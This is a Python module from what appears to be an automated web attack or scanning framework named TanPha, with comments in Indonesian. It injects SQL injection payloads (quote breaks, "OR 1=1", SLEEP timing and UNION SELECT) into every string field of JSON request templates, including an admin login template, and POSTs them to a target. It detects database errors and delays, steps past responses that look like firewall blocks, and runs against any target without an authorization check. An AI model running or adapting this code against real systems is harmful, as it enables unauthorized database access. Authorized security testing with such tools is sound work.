"""API JSON SQL Injection Module for TanPha V29.0 (Auto-Mutator)."""
import time
import json
import copy
import html
from modules.base import BaseModule
from core.context import TargetContext, Evidence, Finding
from core.verification import VerificationResult, VerificationStatus
from core.ai_router import AIRouter

class APISQLInjectionModule(BaseModule):
    name = "APISQLInjection"
    module_id = "api_sqli"
    version = "29.0 (Auto-Mutator)"
    vulnerability_class = "SQL_INJECTION"
    default_impact = "DATABASE_ACCESS"
    default_privilege = "LIMITED"

    _ERROR_SIGNATURES = [
        "sql syntax", "you have an error in your sql", "unclosed quotation mark",
        "warning: mysql_", "pg_query()", "ora-00933", "sqlstate[",
        "jdbc", "quoted string not properly terminated", "malformed string", "sqlexception"
    ]

    # KAMUS JSON GLOBAL (TànPhá bakal nembak semua ini otomatis)
    COMMON_JSON_TEMPLATES = [
        {"id": "1"},
        {"user_id": "1"},
        {"username": "admin", "password": "password"},
        {"search": "test", "category": "all"},
        {"email": "test@example.com", "name": "test"},
        {"data": {"id": "1", "type": "user"}},
        {"filter": {"keyword": "test"}}
    ]

    def __init__(self):
        super().__init__()
        self.ai = AIRouter()

    def can_run(self, context: TargetContext) -> bool:
        return True

    def _has_sql_error(self, response) -> bool:
        if not response: return False
        if getattr(response, "status_code", 200) == 500:
            if not response.text: return False
            text = html.unescape(response.text).lower()
            return any(sig in text for sig in self._ERROR_SIGNATURES)
        if not response.text: return False
        text = html.unescape(response.text).lower()
        return any(sig in text for sig in self._ERROR_SIGNATURES)

    def _is_waf_block(self, response) -> bool:
        if not response: return False
        if getattr(response, "status_code", 200) in (403, 429, 503): return True
        if response.text:
            text = response.text.lower()
            if "cloudflare" in text or "access denied" in text or "forbidden" in text: return True
        return False

    def _inject_json(self, original_json, payload):
        """Fungsi rekursif buat nyuntik payload ke SEMUA string di dalam JSON"""
        injected = copy.deepcopy(original_json)
        if isinstance(injected, dict):
            for key in injected:
                if isinstance(injected[key], str):
                    injected[key] = payload 
                elif isinstance(injected[key], (dict, list)):
                    injected[key] = self._inject_json(injected[key], payload)
        elif isinstance(injected, list):
            for i in range(len(injected)):
                if isinstance(injected[i], str):
                    injected[i] = payload
                elif isinstance(injected[i], (dict, list)):
                    injected[i] = self._inject_json(injected[i], payload)
        return injected

    def assess(self, context: TargetContext, auth_checker=None) -> list:
        evidence_pool = []
        print(f"      [>] Testing API JSON SQLi (Auto-Mutator) on: {context.target.base_url}")
        
        payloads = ["1'", "1\"", "1' OR 1=1--", "1' AND SLEEP(5)#", "1' UNION SELECT NULL--"]
        
        # Coba semua template JSON yang ada
        for template in self.COMMON_JSON_TEMPLATES:
            for payload in payloads:
                mutated_json = self._inject_json(template, payload)
                
                try:
                    res_obj = context.http_client.request(
                        "POST", context.target.base_url, 
                        json=mutated_json, 
                        headers={"Content-Type": "application/json"},
                        auth_checker=auth_checker, bypass_mutation=True, timeout=20
                    )
                    
                    if res_obj and res_obj.response:
                        response = res_obj.response
                        
                        if self._is_waf_block(response):
                            continue
                            
                        if self._has_sql_error(response):
                            print(f"      [!!] DEFINITIVE SQL ERROR (JSON) with '{payload}'!")
                            evidence_pool.append(Evidence(
                                attempt_id="api_sqli_error", module_id=self.module_id, module_version=self.version,
                                location=context.target.base_url, parameter="JSON_BODY", outcome="ERROR",
                                reason_code="ERROR_BASED", reason_detail="Definitive SQL Error in JSON",
                                confidence=0.95, evidence_text=f"Template: {json.dumps(template)} | Payload: {payload}", assess_payload=payload
                            ))
                            break # Keluar dari loop payload kalau udah nemu
                            
                        # Time based check
                        if "SLEEP" in payload:
                            start = time.time()
                            context.http_client.request(
                                "POST", context.target.base_url, 
                                json=mutated_json,
                                headers={"Content-Type": "application/json"},
                                auth_checker=auth_checker, bypass_mutation=True, timeout=30
                            )
                            elapsed = time.time() - start
                            
                            if elapsed >= 4.5:
                                print(f"      [!!] API BLIND SQLi (Time-Based) CONFIRMED!")
                                evidence_pool.append(Evidence(
                                    attempt_id="api_sqli_time", module_id=self.module_id, module_version=self.version,
                                    location=context.target.base_url, parameter="JSON_BODY", outcome="DELAYED",
                                    reason_code="TIME_DELAY", reason_detail=f"Delay {elapsed:.2f}s",
                                    confidence=0.9, evidence_text="Time Delay in JSON API", assess_payload=payload
                                ))
                                break
                                
                except Exception as e:
                    pass

            if evidence_pool: # Kalau udah nemu di template ini, nggak perlu coba template lain
                break

        return evidence_pool

    def verify(self, context: TargetContext, evidence: Evidence, auth_checker=None) -> VerificationResult:
        if evidence.reason_code in ("ERROR_BASED", "TIME_DELAY"):
            return VerificationResult(
                VerificationStatus.VALIDATED, 0.95, "API_SQLI_CONFIRMED",
                "API SQLi Confirmed.", verify_payload=evidence.assess_payload
            )
        return VerificationResult(VerificationStatus.REJECTED, 0.0, "FAILED", "Not vuln")

    def exploit(self, context: TargetContext, finding: Finding):
        print("\n[***] API SQLI PoC GENERATION [***]")
        print(f"[*] JSON Payload: {finding.verify_payload}")
